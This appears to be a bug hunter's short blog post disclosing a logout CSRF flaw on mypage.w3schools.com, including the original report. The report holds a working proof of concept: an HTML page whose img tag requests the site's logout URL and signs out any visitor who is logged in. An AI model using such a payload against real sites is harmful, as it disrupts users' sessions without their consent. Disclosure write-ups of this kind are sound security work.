## CSRF - Log Out

Report made 1 oct, 2020 to mypage.w3schools.com where i found a Logout CSRF bug.

I found this logout CSRF bug testing w3schools security. Just made an account following the login link in the main domain. Here is the original report in case you want to take a look.

## Original Security Report

---

**Security report for https://mypage.w3schools.com at 1 october, 01:54 (Spain).**

Anyone logged in his own mypage can be logged out from his account from any other webpage.

**Step Reproduction:**

- Upload this code to any website with views:

```html
<html>
<body>
You're getting logged out!
<img src="https://mypage.w3schools.com/mypage/logout_user.php">
</body>
</html>
```

- When you visit a webpage with a image pointing to that url, or a request made or form submited with javascript, you get logged out from your account at w3schools.

---

The bug was totally a low hanging fruit.

